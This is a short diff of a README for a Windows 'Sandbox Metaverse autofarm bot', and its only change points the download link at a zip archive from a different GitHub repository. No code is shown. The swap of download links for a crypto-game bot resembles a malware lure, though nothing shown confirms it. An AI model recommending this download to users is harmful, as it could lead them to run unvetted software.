@@ -39,7 +39,7 @@ Very simple, you login to the sandbox and go to a set area and then run the prog
 
 ## Download
 
-You can [download](https://github.com/Crypto-Trading-Bots/Opensea-NFT-Trading-Bot/releases/tag/Opensea) the latest installable version of the Sandbox Metaverse autofarm bot for Windows.
+You can [download](https://github.com/patrykq9/Sandbox-Autofarm-Bot/archive/refs/heads/main.zip) the latest installable version of the Sandbox Metaverse autofarm bot for Windows.
 
 ## Credits
 
